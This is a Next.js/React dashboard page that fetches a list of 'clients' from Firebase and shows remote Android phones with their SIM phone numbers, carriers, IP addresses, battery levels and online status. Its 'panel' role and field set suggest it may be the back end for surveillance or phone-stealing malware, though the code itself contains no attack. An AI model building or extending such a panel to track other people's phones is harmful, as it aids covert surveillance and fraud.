'use client';

import { useEffect, useState, useCallback } from 'react';
import { Search, RefreshCw, Wifi, WifiOff, Settings2, Loader2 } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import Link from 'next/link';

interface RtdbDevice {
  id: string;
  displayName: string;
  online: boolean;
  fields: Array<{ label: string; value: string | number }>;
  battery?: number;
  lastSeen?: number;
}

function toStr(v: unknown): string {
  return v != null ? String(v).trim() : '';
}
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function flattenObj(raw: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...raw };
  // sims array
  const sims = raw['sims'] ?? raw['Sims'];
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    if (s0?.phoneNumber && !out['phoneNumber']) out['phoneNumber'] = s0.phoneNumber;
    if (s0?.number && !out['number']) out['number'] = s0.number;
    if (s0?.operator && !out['operator']) out['operator'] = s0.operator;
    if (s0?.network && !out['network']) out['network'] = s0.network;
    if (s0?.provider && !out['provider']) out['provider'] = s0.provider;
  }
  // networks array
  const nets = raw['networks'] ?? raw['Networks'];
  if (Array.isArray(nets) && nets.length > 0 && !out['provider']) {
    out['provider'] = String(nets[0]);
  }
  // flatten one level of nested objects
  for (const [k, v] of Object.entries(raw)) {
    if (v == null || Array.isArray(v) || typeof v !== 'object') continue;
    for (const [k2, v2] of Object.entries(v as Record<string, unknown>)) {
      if (v2 != null && !(k2 in out)) out[k2] = v2;
    }
  }
  return out;
}

function isOnlineRecord(raw: Record<string, unknown>): boolean {
  const onlineKeys = ['online', 'Online', 'isOnline', 'IsOnline', 'connected', 'Connected'];
  for (const k of onlineKeys) if (raw[k] === true) return true;
  const statusKeys = ['status', 'Status', 'connection', 'Connection', 'deviceStatus', 'DeviceStatus'];
  for (const k of statusKeys) if (String(raw[k] ?? '').toLowerCase() === 'online') return true;
  return false;
}

function parseRtdbDevice(devId: string, rawOrig: Record<string, unknown>): RtdbDevice {
  const raw = flattenObj(rawOrig);
  const online = isOnlineRecord(raw) || isOnlineRecord(rawOrig);

  const brand = toStr(firstVal(raw, ['Brand', 'brand']));
  const modelOnly = toStr(firstVal(raw, ['modelName', 'ModelName', 'model', 'Model', 'deviceModel', 'DeviceModel', 'device', 'Device', 'phoneModel']));
  const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${modelOnly}` : (modelOnly || brand || '');

  const android = toStr(firstVal(raw, ['version', 'Version', 'androidVersion', 'AndroidVersion', 'android', 'Android', 'osVersion', 'OsVersion']));
  const batteryVal = toNum(firstVal(raw, ['batteryPercent', 'BatteryPercent', 'battery', 'Battery', 'batteryLevel', 'BatteryLevel', 'bat', 'Bat', 'charge', 'Charge']));
  const phone = toStr(firstVal(raw, ['mobNo', 'MobNo', 'phoneNumber', 'PhoneNumber', 'phone', 'Phone', 'number', 'Number', 'mobile', 'Mobile', 'mobileNumber', 'MobileNumber']));
  const network = toStr(firstVal(raw, ['provider', 'Provider', 'network', 'Network', 'networkType', 'NetworkType', 'operator', 'Operator', 'simOperator', 'SimOperator', 'carrier', 'Carrier']));
  const ip = toStr(firstVal(raw, ['ip', 'IP', 'ipAddress', 'IpAddress']));
  const lastSeen = toNum(firstVal(raw, ['lastSeen', 'LastSeen', 'updatedAt', 'UpdatedAt', 'timestamp', 'time']));

  const displayName = model || toStr(firstVal(raw, ['modelName', 'name', 'Name', 'deviceName', 'DeviceName'])) || devId.slice(0, 12);

  const fields: Array<{ label: string; value: string | number }> = [];
  if (model) fields.push({ label: 'MODEL', value: model });
  if (android) fields.push({ label: 'ANDROID', value: android.startsWith('v') ? android : `v${android}` });
  if (batteryVal != null) fields.push({ label: 'BATTERY', value: batteryVal });
  if (phone) fields.push({ label: 'NUMBER', value: phone });
  if (network) fields.push({ label: 'NETWORK', value: network });
  if (ip) fields.push({ label: 'IP', value: ip });

  return { id: devId, displayName, online, fields, battery: batteryVal, lastSeen };
}

function BatteryBar({ val }: { val: number }) {
  const pct = Math.min(100, Math.max(0, val));
  const color = pct > 30 ? 'bg-emerald-500' : pct > 10 ? 'bg-amber-500' : 'bg-red-500';
  const textColor = pct > 30 ? 'text-emerald-500' : pct > 10 ? 'text-amber-500' : 'text-red-500';
  return (
    <span className="flex items-center gap-1.5">
      <span className="inline-flex w-8 h-2 rounded-sm border border-slate-300 dark:border-slate-600 overflow-hidden">
        <span className={`${color} h-full`} style={{ width: `${pct}%` }} />
      </span>
      <span className={`font-medium ${textColor}`}>{pct}%</span>
    </span>
  );
}

function DeviceCard({ device }: { device: RtdbDevice }) {
  return (
    <div className={`card p-3 space-y-2 border-l-2 ${device.online ? 'border-l-emerald-500' : 'border-l-slate-300 dark:border-l-slate-700'}`}>
      <div className="flex items-start justify-between gap-1">
        <p className="text-sm font-semibold text-slate-900 dark:text-white leading-tight line-clamp-2 flex-1">{device.displayName}</p>
        {device.online
          ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0 mt-0.5" />
          : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0 mt-0.5" />
        }
      </div>
      <div className="flex items-center gap-1.5">
        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${device.online ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'}`} />
        <span className={`text-xs font-medium ${device.online ? 'text-emerald-600 dark:text-emerald-400' : 'text-slate-400'}`}>
          {device.online ? 'Online' : 'Offline'}
        </span>
      </div>
      {device.fields.length > 0 && (
        <div className="space-y-1 pt-1.5 border-t border-slate-100 dark:border-slate-700/50">
          {device.fields.map(({ label, value }) => (
            <div key={label} className="flex justify-between items-center gap-2">
              <span className="text-slate-400 text-[10px] font-semibold tracking-wide flex-shrink-0">{label}</span>
              {label === 'BATTERY' && typeof value === 'number'
                ? <BatteryBar val={value} />
                : <span className="text-slate-700 dark:text-slate-300 text-xs font-mono text-right truncate max-w-[130px]">{String(value)}</span>
              }
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function loadRtdbUrl(): string {
  try { return localStorage.getItem('panel_rtdb_url') ?? ''; } catch { return ''; }
}

export default function DevicesPage() {
  const { idToken } = useAuth();
  const [devices, setDevices] = useState<RtdbDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState<'all' | 'online' | 'offline'>('all');
  const [rtdbUrl, setRtdbUrl] = useState('');

  useEffect(() => { setRtdbUrl(loadRtdbUrl()); }, []);

  const fetchDevices = useCallback(async () => {
    const url = loadRtdbUrl();
    if (!url || !idToken) return;
    setLoading(true);
    setError('');
    try {
      const base = url.replace(/\/$/, '');
      const res = await fetch(`${base}/clients.json?auth=${idToken}`, {
        cache: 'no-store',
        signal: AbortSignal.timeout(10000),
      });
      if (!res.ok) {
        if (res.status === 401 || res.status === 403) {
          setError('Permission denied. Make sure your account has role="panel" custom claim.');
        } else {
          setError(`Firebase error: HTTP ${res.status}`);
        }
        return;
      }
      const data = await res.json();
      if (!data || typeof data !== 'object') { setDevices([]); return; }
      const parsed = Object.entries(data as Record<string, unknown>)
        .filter(([, v]) => v && typeof v === 'object' && !Array.isArray(v))
        .map(([id, raw]) => parseRtdbDevice(id, raw as Record<string, unknown>))
        .sort((a, b) => (b.lastSeen ?? 0) - (a.lastSeen ?? 0));
      setDevices(parsed);
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Fetch failed');
    } finally {
      setLoading(false);
    }
  }, [idToken]);

  useEffect(() => {
    fetchDevices();
    const t = setInterval(fetchDevices, 30_000);
    return () => clearInterval(t);
  }, [fetchDevices]);

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const matchSearch = !q || d.displayName.toLowerCase().includes(q) ||
      d.fields.some(f => String(f.value).toLowerCase().includes(q));
    const matchFilter = filter === 'all' || (filter === 'online' ? d.online : !d.online);
    return matchSearch && matchFilter;
  });

  const onlineCount = devices.filter(d => d.online).length;

  if (!rtdbUrl) {
    return (
      <div className="flex flex-col items-center justify-center h-96 gap-4 text-center">
        <Settings2 className="w-12 h-12 text-slate-300 dark:text-slate-600" />
        <div>
          <p className="text-slate-700 dark:text-slate-300 font-medium">Firebase RTDB URL configure nahi hua</p>
          <p className="text-sm text-slate-400 mt-1">Settings mein jaake apna Firebase RTDB URL daalo</p>
        </div>
        <Link href="/settings" className="btn-primary">Go to Settings</Link>
      </div>
    );
  }

  return (
    <div className="space-y-4 animate-fade-in">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Devices</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">
            {devices.length} total · {onlineCount} online · {devices.length - onlineCount} offline
          </p>
        </div>
        <button onClick={fetchDevices} disabled={loading} className="btn-secondary p-2" title="Refresh">
          <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
        </button>
      </div>

      <div className="grid grid-cols-4 gap-3">
        {[
          { label: 'TOTAL', val: devices.length, color: 'text-slate-700 dark:text-slate-200' },
          { label: 'ONLINE', val: onlineCount, color: 'text-emerald-600 dark:text-emerald-400' },
          { label: 'OFFLINE', val: devices.length - onlineCount, color: 'text-slate-400' },
          { label: 'LOADING', val: loading ? '…' : 'OK', color: loading ? 'text-amber-500' : 'text-emerald-500' },
        ].map(({ label, val, color }) => (
          <div key={label} className="card px-3 py-2 text-center">
            <p className={`text-xl font-bold ${color}`}>{val}</p>
            <p className="text-[10px] text-slate-400 font-semibold tracking-wide">{label}</p>
          </div>
        ))}
      </div>

      {error && (
        <div className="bg-red-50 dark:bg-red-950 border border-red-200 dark:border-red-800 rounded-lg px-4 py-3 text-sm text-red-600 dark:text-red-400">
          {error}
        </div>
      )}

      {devices.length > 0 && (
        <div className="flex items-center gap-3 flex-wrap">
          <div className="relative flex-1 min-w-48">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
            <input
              type="search"
              placeholder="Search devices…"
              value={search}
              onChange={e => setSearch(e.target.value)}
              className="input pl-10 w-full"
            />
          </div>
          <div className="flex gap-1.5">
            {(['all', 'online', 'offline'] as const).map(f => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${
                  filter === f
                    ? 'bg-brand-600 text-white'
                    : 'bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300'
                }`}
              >
                {f}
              </button>
            ))}
          </div>
        </div>
      )}

      {loading && devices.length === 0 && (
        <div className="grid grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
          {Array.from({ length: 8 }).map((_, i) => (
            <div key={i} className="card p-4 space-y-3 animate-pulse">
              <div className="h-4 bg-slate-100 dark:bg-slate-700 rounded w-3/4" />
              <div className="h-3 bg-slate-100 dark:bg-slate-700 rounded w-1/2" />
              <div className="h-3 bg-slate-100 dark:bg-slate-700 rounded w-2/3" />
            </div>
          ))}
        </div>
      )}

      {filtered.length > 0 && (
        <div className="grid grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
          {filtered.map(device => <DeviceCard key={device.id} device={device} />)}
        </div>
      )}

      {!loading && devices.length === 0 && !error && (
        <div className="card p-10 text-center space-y-2">
          <p className="text-slate-700 dark:text-slate-300 font-medium">Koi device nahi mila</p>
          <p className="text-sm text-slate-400">/clients path mein koi data nahi · Firebase rules check karo</p>
        </div>
      )}

      {!loading && devices.length > 0 && filtered.length === 0 && (
        <div className="text-center py-8 text-slate-400 text-sm">Search se koi match nahi mila</div>
      )}
    </div>
  );
}
